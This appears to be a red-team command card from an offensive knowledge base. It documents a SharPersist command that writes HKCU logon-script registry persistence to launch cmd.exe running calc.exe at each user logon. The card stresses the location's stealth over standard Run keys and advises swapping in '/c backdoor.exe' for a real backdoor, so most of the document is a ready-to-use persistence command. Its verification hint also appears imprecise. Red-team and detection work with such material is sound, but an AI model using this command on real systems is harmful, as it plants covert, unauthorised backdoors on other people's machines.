---
type: command
executor: cmd
data: >-
  SharpPersist.exe -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k
  "logonscript" -m add
output: null
platforms:
  - Windows
tags:
  - persistence
  - registry
  - logon
verified: true
validated: true
---

# sharpersist-add-logonscript-persistence-cmd-calc

## Command

```cmd
SharpPersist.exe -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "logonscript" -m add
```

## Description

Adds registry persistence via the HKCU logon script key to run `cmd.exe /c calc.exe` during user logon. This targets a less common location for added stealth compared to standard Run keys.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -t reg | Type: registry | Yes |
| -c "C:\Windows\System32\cmd.exe" | Command executable | Yes |
| -a "/c calc.exe" | Arguments | Yes |
| -k "logonscript" | Key: logonscript registry location | Yes |
| -m add | Mode: add | Yes |

## Examples

### Basic Usage

```cmd
SharpPersist.exe -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "logonscript" -m add
```

### Advanced Usage

For backdoor: Change -a to `/c backdoor.exe`.

## Expected Output

`Added logonscript persistence 'Test Stuff'.` Check with `reg query HKCU\Environment /v UserInit` or similar logon keys for the entry.

## Related

- [[procedures/windows-simple-user-registry-persistence]]
- [[tools/sharpersist]]
